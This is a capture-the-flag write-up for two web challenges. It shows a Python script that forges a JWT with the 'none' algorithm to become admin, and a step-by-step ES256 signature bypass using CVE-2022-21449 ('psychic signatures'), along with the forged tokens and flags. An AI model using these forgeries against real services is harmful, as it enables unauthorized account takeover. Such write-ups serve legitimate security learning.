# Web

## jalyboy-baby


### Info

![](screenshots/1.png)

![](screenshots/4.png)

##solution:

First this when we click in login as guest we can see that a jwt is generated in a url param:


![](screenshots/2.png)



So first i tried to crack the secret key but it didnt work so i tried none algorithm attack using this python script:

```python
import jwt



given_token = 'eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.uHMs3WJcQ4kxWlcKpN0kcsQFx0tau9TW56GSBzt4AkOpW2pud0tNKRJUnq_tzjj3kYQcUFLiSv396qxatqvTkg'



try:

    decoded_token = jwt.decode(given_token, options={"verify_signature":False})
    print("Decoded Token:", decoded_token)


    decoded_token['sub'] = 'admin'


    # Encode the modified payload
    encoded_token = jwt.encode(decoded_token, None , algorithm=None)
    print("Encoded Token after modification:", encoded_token)

except jwt.ExpiredSignatureError:
    print("Token has expired.")
except jwt.InvalidTokenError:
    print("Invalid token.")
```

it gived me:

```bash
Decoded Token: {'sub': 'guest'}
Encoded Token after modification: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
                                                    
```
when i pass it to the parameter :

![](screenshots/3.png)


the flag:
`LINECTF{337e737f9f2594a02c5c752373212ef7}`




###jalyboy-jalygirl:

this challenge had a really easy solution but i spent 2 hours to find it 


![](screenshots/6.png)
![](screenshots/5.png)


same thing when we try to login as guest we get a jwt in url,
after reading the source code the only diffrence from the first chall was this line
`KeyPair keyPair = Keys.keyPairFor(SignatureAlgorithm.ES256);`

the web app uses eliptic curve to generate pair public keys, so i thought bout confusion attack and tried many ways to get the public key like using openssl 

##solution:

but i when i read the description again i felt like the problem is exactly in java and ES256's (eliptic curve) imlepmentation
so i searched deeply  till i found that there is a cve` CVE-2022-21449, known as “psychic signatures”`
basically tampering the body and then replacing the signature with the following value: `MAYCAQACAQA` will bypass the signature verification

so lets say we had this token :`eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.HVaXPG5K69128-N-nmjB-tw3KxrABuGUbwcM0ukctAfMXhHqwkxoZ_cfBOoDquRTrH_g8qTlitX49TYjQIejzQ`

1- first thing is to delete the signature part so it would be :`eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9`

2- second step is to modify the payload from `{"sub":"guest"}` to `{"sub":"admin"}` so the jwt will look like:
`eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9`

3-last step is adding the value:
`eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.MAYCAQACAQA`

passing this thru the paramter will give us the flag:

![](screenshots/7.png)

the flag:
`LINECTF{abaa4d1cb9870fd25776a81bbd278932}`



